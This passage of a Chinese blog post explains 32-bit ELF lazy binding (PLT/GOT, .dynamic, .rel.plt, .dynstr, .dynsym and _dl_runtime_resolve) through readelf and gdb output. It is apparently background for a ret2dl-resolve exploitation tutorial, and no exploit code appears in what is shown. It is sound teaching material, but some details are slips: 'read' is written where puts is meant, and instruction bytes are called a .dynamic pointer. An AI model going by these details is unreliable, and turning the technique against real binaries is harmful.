edx</span><br><span class="line">   <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffd03c</span> —▸ <span class="number">0x8048429</span> ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffd040</span> —▸ <span class="number">0x80484c0</span> ◂— dec    eax <span class="comment">/* 'Hello Pwn\n' */</span></span><br><span class="line">02:0008│      0xffffd044 —▸ 0xffffd104 —▸ 0xffffd2de ◂— '/home/syc/Downloads/retdll/a.out'</span><br><span class="line">03:000c│      0xffffd048 —▸ 0xffffd10c —▸ 0xffffd2ff ◂— 'XDG_VTNR=7'</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffd04c</span> —▸ <span class="number">0x8048461</span> ◂— lea    eax, [ebx - <span class="number">0xf8</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffffd050</span> —▸ <span class="number">0xf7fb33dc</span> (__exit_funcs) —▸ <span class="number">0xf7fb41e0</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffffd054</span> —▸ <span class="number">0xffffd070</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│ ebp  <span class="number">0xffffd058</span> ◂— <span class="number">0x0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>  <span class="number">80482e0</span> <span class="built_in">puts</span>@plt</span><br><span class="line">   f <span class="number">1</span>  <span class="number">8048429</span></span><br><span class="line">   f <span class="number">2</span> f7e19637 __libc_start_main+<span class="number">247</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以发现，是<strong>0x80482e6</strong>这个地址，并不直接是<strong>libc</strong>的<strong>puts</strong>函数的地址。这是因为<strong>linux</strong>在程序加载时使用了延迟绑定(<strong>lazyload</strong>)，只有等到这个函数被调用了，才去把这个函数在<strong>libc</strong>的地址放到<strong>GOT</strong>表中。接下来，会再<strong>push</strong>一个<strong>0</strong>，再<strong>push</strong>一个<strong>dword ptr  [0x804a004]</strong>，最后跳到<strong>libc</strong>的<strong>_dl_runtime_resolve</strong>（<code>call   _dl_fixup</code>）去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是<strong>puts</strong>）的地址，然后放到相应的<strong>GOT</strong>表，并且调用它。而这个函数的地址也是从<strong>GOT</strong>表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定</p><p> 了解一下elf各段之间的关系 ，才能更好的理解前面从PLT到GOT的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -S a.out</span><br><span class="line">There are <span class="number">29</span> section headers, starting at offset <span class="number">0x114c</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .interp           PROGBITS        <span class="number">08048154</span> <span class="number">000154</span> <span class="number">000013</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .note.ABI-tag     NOTE            <span class="number">08048168</span> <span class="number">000168</span> <span class="number">000020</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .note.gnu.build-i NOTE            <span class="number">08048188</span> <span class="number">000188</span> <span class="number">000024</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .gnu.hash         GNU_HASH        <span class="number">080481</span>ac <span class="number">0001</span>ac <span class="number">000020</span> <span class="number">04</span>   A  <span class="number">5</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .dynsym           DYNSYM          <span class="number">080481</span>cc <span class="number">0001</span>cc <span class="number">000050</span> <span class="number">10</span>   A  <span class="number">6</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">6</span>] .dynstr           STRTAB          <span class="number">0804821</span>c <span class="number">00021</span>c <span class="number">00004</span>a <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .gnu.version      VERSYM          <span class="number">08048266</span> <span class="number">000266</span> <span class="number">00000</span>a <span class="number">02</span>   A  <span class="number">5</span>   <span class="number">0</span>  <span class="number">2</span></span><br><span class="line">  [ <span class="number">8</span>] .gnu.version_r    VERNEED         <span class="number">08048270</span> <span class="number">000270</span> <span class="number">000020</span> <span class="number">00</span>   A  <span class="number">6</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">9</span>] .rel.dyn          REL             <span class="number">08048290</span> <span class="number">000290</span> <span class="number">000008</span> <span class="number">08</span>   A  <span class="number">5</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">10</span>] .rel.plt          REL             <span class="number">08048298</span> <span class="number">000298</span> <span class="number">000010</span> <span class="number">08</span>  AI  <span class="number">5</span>  <span class="number">24</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">11</span>] .init             PROGBITS        <span class="number">080482</span>a8 <span class="number">0002</span>a8 <span class="number">000023</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">12</span>] .plt              PROGBITS        <span class="number">080482</span>d0 <span class="number">0002</span>d0 <span class="number">000030</span> <span class="number">04</span>  AX  <span class="number">0</span>   <span class="number">0</span> <span class="number">16</span></span><br><span class="line">  [<span class="number">13</span>] .plt.got          PROGBITS        <span class="number">08048300</span> <span class="number">000300</span> <span class="number">000008</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">8</span></span><br><span class="line">  [<span class="number">14</span>] .text             PROGBITS        <span class="number">08048310</span> <span class="number">000310</span> <span class="number">000192</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span> <span class="number">16</span></span><br><span class="line">  [<span class="number">15</span>] .fini             PROGBITS        <span class="number">080484</span>a4 <span class="number">0004</span>a4 <span class="number">000014</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">16</span>] .rodata           PROGBITS        <span class="number">080484b</span>8 <span class="number">0004b</span>8 <span class="number">000013</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">17</span>] .eh_frame_hdr     PROGBITS        <span class="number">080484</span>cc <span class="number">0004</span>cc <span class="number">00002</span>c <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">18</span>] .eh_frame         PROGBITS        <span class="number">080484f</span>8 <span class="number">0004f</span>8 <span class="number">0000</span>cc <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">19</span>] .init_array       INIT_ARRAY      <span class="number">08049f</span>08 <span class="number">000f</span>08 <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">20</span>] .fini_array       FINI_ARRAY      <span class="number">08049f</span>0c <span class="number">000f</span>0c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">21</span>] .jcr              PROGBITS        <span class="number">08049f</span>10 <span class="number">000f</span>10 <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">22</span>] .dynamic          DYNAMIC         <span class="number">08049f</span>14 <span class="number">000f</span>14 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">23</span>] .got              PROGBITS        <span class="number">08049f</span>fc <span class="number">000f</span>fc <span class="number">000004</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">24</span>] .got.plt          PROGBITS        <span class="number">0804</span>a000 <span class="number">001000</span> <span class="number">000014</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">25</span>] .data             PROGBITS        <span class="number">0804</span>a014 <span class="number">001014</span> <span class="number">000008</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS          <span class="number">0804</span>a01c <span class="number">00101</span>c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">27</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">00101</span>c <span class="number">000035</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">28</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">001051</span> <span class="number">0000f</span>a <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br></pre></td></tr></table></figure><p>我们一般只关注几个比较重要的 section </p><table><thead><tr><th align="center">.dynsym</th><th align="center">动态链接符号表</th></tr></thead><tbody><tr><td align="center"><strong>.dynstr</strong></td><td align="center"><strong>动态链接的字符串</strong></td></tr><tr><td align="center"><strong>.rel.dyn</strong></td><td align="center"><strong>变量重定位</strong></td></tr><tr><td align="center"><strong>.rel.plt</strong></td><td align="center"><strong>函数重定位</strong></td></tr><tr><td align="center"><strong>.got</strong></td><td align="center"><strong>全局变量偏移表</strong></td></tr><tr><td align="center"><strong>.got.plt</strong></td><td align="center"><strong>全局函数偏移表</strong></td></tr></tbody></table><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>包含了一些关于动态链接的关键信息，在里这它长这样，事实上这个section所有程序都差不多 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -d a.out</span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482a8</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484a4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f08</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">74</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048298</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048290</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048270</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048266</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>然后<strong>.dynamic</strong>每个元素的结构体是这样的， 一个 <strong>Elf_Dyn</strong> 是一个键值对，其中 <strong>d_tag</strong> 是键，<strong>d_value</strong> 是值 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>这个<strong>section</strong>的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><h3 id="DT-JMPREL-rel-plt"><a href="#DT-JMPREL-rel-plt" class="headerlink" title="DT_JMPREL(.rel.plt)"></a>DT_JMPREL(.rel.plt)</h3><p> 可以看到<code>puts</code>符号位于<strong>.rel.plt</strong>的第一个，也就是偏移为<strong>0×0</strong>的地方，这里的<code>r_offset</code>（偏移量）就是<strong>.got.plt</strong>的地址 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -r a.out</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.dyn' at offset 0x290 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">08049f</span>fc  <span class="number">00000206</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.plt' at offset 0x298 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">0804</span>a00c  <span class="number">00000107</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   <span class="built_in">puts</span>@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a010  <span class="number">00000307</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   __libc_start_main@GLIBC_2<span class="number">.0</span></span><br></pre></td></tr></table></figure><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h3 id="DT-STRTAB-dynstr"><a href="#DT-STRTAB-dynstr" class="headerlink" title="DT_STRTAB(.dynstr)"></a>DT_STRTAB(.dynstr)</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0804821</span>C ; ELF String Table</span><br><span class="line">LOAD:<span class="number">0804821</span>C byte_804821C    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481</span>DC↑o</span><br><span class="line">LOAD:<span class="number">0804821</span>C                                         ; LOAD:<span class="number">080481</span>EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aPuts           db 'puts',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br></pre></td></tr></table></figure><p> 一个字符串表，<strong>index</strong>为<strong>0</strong>的地方永远是<strong>0</strong>，然后后面是动态链接所需的字符串，<strong>0</strong>结尾，包括导入函数名，比方说这里很明显有个<strong>puts</strong>。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对<strong>0x804821C</strong>的偏移 </p><h3 id="DT-SYMTAB-dynsym"><a href="#DT-SYMTAB-dynsym" class="headerlink" title="DT_SYMTAB(.dynsym)"></a>DT_SYMTAB(.dynsym)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$  readelf -s a.out</span><br><span class="line"></span><br><span class="line">Symbol table '.dynsym' contains 5 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND <span class="built_in">puts</span>@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484b</span>c     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br></pre></td></tr></table></figure><p> 这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的<strong>puts</strong>。结构体定义如下 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(info) ((info)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(info) ((unsigned char)(info))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span></span><br></pre></td></tr></table></figure><h2 id="解析符号"><a href="#解析符号" class="headerlink" title="解析符号"></a>解析符号</h2><p> 假设<strong>.dynsym</strong>的地址为<strong>080481cc</strong>，又因为<strong>puts</strong>函数对应的<strong>num</strong>为<strong>1</strong> ，则程序会去<strong>0x080481cc+0x10*1</strong>寻找<strong>st_name</strong>即<strong>puts</strong>字符串在<strong>.dynstr</strong>中的偏移 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">4</span>wx <span class="number">0x080481cc</span>+<span class="number">0x10</span>*<span class="number">1</span></span><br><span class="line"><span class="number">0x80481dc</span>:    <span class="number">0x0000001a</span>    <span class="number">0x00000000</span>    <span class="number">0x00000000</span>    <span class="number">0x00000012</span></span><br></pre></td></tr></table></figure><p>解释一下这一串地址<code>0x080481cc+0x10*1</code>的意义</p><blockquote><ul><li>0x080481cc 对应.dynsym的地址</li><li>0×10 ： 每一条symbol信息的大小在SYMENT中体现，为16 bytes （可以用readelf -d fun命令查看）</li><li>1 ： num值为1</li></ul></blockquote><p>可以看到0x080481dc对应的第一个值为0x1a， 再利用如下命令即可找到puts符号 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/s 0x0804821c+0x1a</span><br><span class="line">0x8048236:    &quot;puts&quot;</span><br></pre></td></tr></table></figure><p>0x0804821c+0x1a 解析</p><blockquote><ul><li>0x0804821c 对应于.dynstr的地址</li><li>0x1a 对应刚才得到的偏移</li></ul></blockquote><h1 id="函数执行流程分析"><a href="#函数执行流程分析" class="headerlink" title="函数执行流程分析"></a>函数执行流程分析</h1><p>用gdb运行这个程序，并在puts函数处下断点 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x80482e0</span>  &lt;<span class="built_in">puts</span>@plt&gt;                  jmp    dword ptr [<span class="number">0x804a00c</span>]</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x80482e6</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">   <span class="number">0x80482eb</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x80482d0</span></span><br></pre></td></tr></table></figure><p>执行到我们下的断点处发现，会跳转到<code>0x804a00c</code>这个地址 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x804a00c</span></span><br><span class="line"><span class="number">0x804a00c</span>:<span class="number">0x080482e6</span></span><br></pre></td></tr></table></figure><p>0x0804a00c这个地址处存储的内容为&lt;puts@plt+6&gt;的地址，因为这个程序第一次运行所以got表中没有保存read函数的地址，所以程序又跳转会&lt;puts@plt+6&gt;，所以紧接着会执行 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80482e6</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line"><span class="number">0x80482eb</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x80482d0</span></span><br></pre></td></tr></table></figure><p>先将0×0压栈（0×0 表示相对.rel.plt的偏移，通过上面分析我们可以知道，read符号在.rel.plt中的位置为第一个，所以偏移为0），又跳转到0x80482d0，看一下该地处的内容 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>i <span class="number">0x080482d0</span></span><br><span class="line">   <span class="number">0x80482d0</span>:push   DWORD PTR ds:<span class="number">0x804a004</span></span><br><span class="line">   <span class="number">0x80482d6</span>:jmp    DWORD PTR ds:<span class="number">0x804a008</span></span><br></pre></td></tr></table></figure><p>会将<strong>0x804a004</strong>压栈，然后跳转到<strong>0x804a008</strong>处。</p><ul><li><strong>0x804a004</strong>处对应一个指向内部数据结构的指针，类型是 <strong>link_map</strong>，在动态装载器内部使用，包含了进行符号解析需要的当前 <strong>ELF</strong> 对象的信息。在它的 <strong>l_info</strong> 域中保存了 .<strong>dynamic</strong> 段中大多数条目的指针构成的一个数组，我们后面会利用它。 <strong>link_map</strong>的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了.<strong>dynamic</strong>的指针，通过这个<strong>link_map</strong>，<strong>_dl_runtime_resolve</strong>函数可以访问到.<strong>dynamic</strong>这个<strong>section</strong> </li><li><strong>0x0804a008</strong> 处为函数 <strong>dl_runtime_resolve</strong>(<strong>link_map</strong>,<strong>rel_offset</strong>)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4wx 0xf7fee000</span><br><span class="line">0xf7fee000 &lt;_dl_runtime_resolve&gt;:0x8b5251500x8b1024540xe80c24440xffff97d0</span><br></pre></td></tr></table></figure><p> 0xe80c2444是<strong>.dynamic</strong>的指针，与前面图中一致</p><p> 我们看一下dl_runtime_resolve()函数的实现 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 